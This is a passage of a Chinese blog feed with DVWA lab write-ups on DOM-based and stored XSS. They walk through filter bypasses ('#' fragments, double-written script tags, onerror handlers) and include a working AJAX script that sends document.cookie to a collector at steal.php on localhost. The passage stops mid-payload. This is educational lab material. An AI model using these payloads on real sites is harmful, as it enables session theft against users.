    <content type="html"><![CDATA[<p>总结了dvwa中的dom型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&apos;default=&apos;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&apos;default=&apos;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有php代码，但是我们可以仔细一步步分析js代码</p><p>首先明白几个对象：</p><p>document:每个载入浏览器的html文档都会成为document对象</p><p>location:location对象包含了当前相关的url信息，href是location对象的属性，location.href能返回完整的URL</p><p>几个方法：</p><p>indexOf：string.indexOf(searchvalue)返回搜索的子字符串在原字符串中第一次出现 的位置，如果搜索的字符串不存在，则返回-1</p><p>substring:string.substring(start，stop)提取字符串中介于两个指定下标之间的字符</p><p>从start处开始提取，到stop位置但不包括stop位置的字符，如果stop参数省略，则返回从start处开始到结束的字符</p><p>明白了这几个对象和方法后再来看这串js代码</p><p>If语句执行条件是检查url中是否含有’default=’这个字符串，如果有则执行if语句</p><p>也就是说if语句执行条件是必须通过GET方式传入一个default值才会执行if语句</p><p>执行之后定义一个变量lang，存储的是url中’default=’之后到结束的字符，也就是default的值</p><p>之后将lang进行url解码然后写入option标签中</p><p>这里没有php代码，也就是并没有与服务器交互，但是我们可以通过dom树解析js代码进行xss注入，也就是通过GET一个default值注入JS代码，然后执行if语句，就可以执行我们注入的JS代码，这就属于dom型的xss</p><p>于是我们输入default:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然出现了弹窗</p><p>接下来考虑窃取cookie值</p><p>按之前的方法利用ajax将cookie值传入steal.php，再将cookie值写入数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">if(stripos($_GET[&apos;default&apos;],&apos;&lt;script&apos;) !== false)&#123;</span><br><span class="line">header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出在服务器端对GET的default值进行了过滤，一旦检测到defalut值中含有&lt;script，就立刻重定向到default值为English的页面</p><p>解决方法是利用字符#，该字符后的数据不会发送到服务器端，从而绕过服务器的过滤，输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(stored)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><p>还有一种方法就是通过触发onerror事件来执行js代码</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(”xss”))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是发现并没有弹框，为什么呢，仔细看一下代码发现img标签是包含在option标签里面的，所以img标签并不会被解析</p><p>这里要闭合option标签和select标签才可以解析出img标签</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框</p><p>但是因为我们提前闭合了option和select标签，所以后面的select结构都会被破坏，整个页面结构都被破坏了，所以这种方法并不是很实用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试通过onerror事件执行ajax代码，将cookie值发送给steal.php，然后写入数据库 </p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">$default=$_GET[&apos;default&apos;];</span><br><span class="line">switch($default)&#123;</span><br><span class="line">case &apos;English&apos;:break;</span><br><span class="line">case &apos;French&apos;:break;</span><br><span class="line">case &apos;Spanish&apos;:break;</span><br><span class="line">case &apos;German&apos;:break;</span><br><span class="line">default:header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出default值如果不是选项中的四个值，就重定向到选项为English</p><p>跟上一关一样，依然可以采用字符#绕过过滤</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框 </p><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(stored)</title>
    <link href="https://Foxgrin.github.io//posts/64824/"/>
    <id>https://Foxgrin.github.io//posts/64824/</id>
    <published>2018-07-11T12:47:00.000Z</published>
    <updated>2018-07-11T13:33:57.097Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的存储型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(<span class="string">'security'</span>,<span class="string">'low'</span>,time()+<span class="number">3600</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnSign'</span>]))&#123;</span><br><span class="line">$name=trim($_POST[<span class="string">'txtName'</span>]);</span><br><span class="line">$message=trim($_POST[<span class="string">'mtxMessage'</span>]);</span><br><span class="line">$message=stripslashes($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$sql=<span class="string">"INSERT INTO guestbook (comment,name) VALUES ('$message','$name')"</span>;</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnClear'</span>]))&#123;</span><br><span class="line">$sql=<span class="string">"DELETE FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT name,comment FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Name:"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Message:"</span>.$row[<span class="string">'comment'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码可以看出将我们POST的name和message写入数据库，并且原原本本的输出存入数据库的name和message，所以很明显存在xss漏洞，这种属于存储型的xss，先将恶意脚本代码存入数据库中，然后用户每次访问网页时都会执行一次恶意代码 </p><p>我们在name中输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再次刷新页面依然会跳出提示框 </p><p>那么我们再按反射型xss关卡中的通过存入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来跳转到steal.php</p><p>再将cookie值存入数据库的方法试一下 </p><p><img src="/img/dvwa-xss-stored/2.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功写入cookie值</p><p>但是再次刷新进入页面时，每次都会跳转回steal.php，并写入一次cookie值，这难免会引起用户的怀疑</p><p>这里可以采用ajax技术，即创建一个用javascript代码创建一个XMLHttpRequest对象，这个对象可以在后台与服务器交换数据，就不需要跳转到steal.php了</p><p>脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/demo/xss(reflected)/steal.php"</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">"data="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ajax=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure><p>然后POST </p><p><img src="/img/dvwa-xss-stored/4.png" alt=""></p><p>每次访问页面都会讲cookie值写入数据库 </p><p><img src="/img/dvwa-xss-stored/5.png" alt=""></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$name);</span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出这关对message进行了丢弃标签的过滤，而且使用了htmlspecialchars这个函数，这个函数可以使html标签实体化，让标签不再是标签，完全防止了xss注入，所以这关只能在name注入，但是name同时也过滤了script标签，但是没事，跟之前关卡一样，我们可以采用双写绕过过滤 </p><p>在name中输入 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(‘xss’)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹窗</p><p>那么继续思考如何窃取cookie，答案就是双写</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=’cookie.js’&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$name);                                                                                                                                                         </span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里对name进行了正则匹配过滤掉了包含按顺序的&lt;,s,c,r,i,p,t字符组成的字符串，所以这里只能通过触发onerror事件来执行js代码</p><p>通过加载图片过程发生异常触发onerror事件</p><p>在name中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">#</span> <span 